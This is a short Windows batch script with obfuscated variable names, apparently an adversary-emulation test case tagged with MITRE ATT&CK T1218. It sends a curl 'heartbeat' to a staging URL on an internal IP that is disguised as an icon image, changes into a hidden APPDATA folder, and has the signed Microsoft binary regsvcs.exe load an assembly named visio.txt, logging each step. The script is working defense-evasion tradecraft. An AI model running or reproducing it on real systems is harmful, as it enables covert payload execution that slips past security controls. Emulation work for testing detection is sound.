@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9373\a72554b5
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9373-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=visio.txt
SET ewjmdkff=9373
SET svbyrhx=%APPDATA%\!pudaazx!\macula-simulations.log
SET ghiwep=1
SET bksmdsq=

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_start=init>> "!svbyrhx!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat=sent>> "!svbyrhx!" 2>nul
cd /d "!pjkcpgw!" 2>nul
if errorlevel 1 (SET ghiwep=0&SET bksmdsq=chdir_failed)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir=!errorlevel!>> "!svbyrhx!" 2>nul
if !ghiwep!==1 (
    %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe "!syjfr!"
    if errorlevel 1 (SET ghiwep=0&SET bksmdsq=assembly_load_failed)
    echo [!DATE! !TIME!][DEBUG][!hlbnp!]: regsvcs_exec=!errorlevel!>> "!svbyrhx!" 2>nul
)
set fdate=!DATE:/=-!
set ftime=!TIME: =0!
echo [!fdate! !ftime!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!ghiwep!:!bksmdsq!>> "!svbyrhx!" 2>nul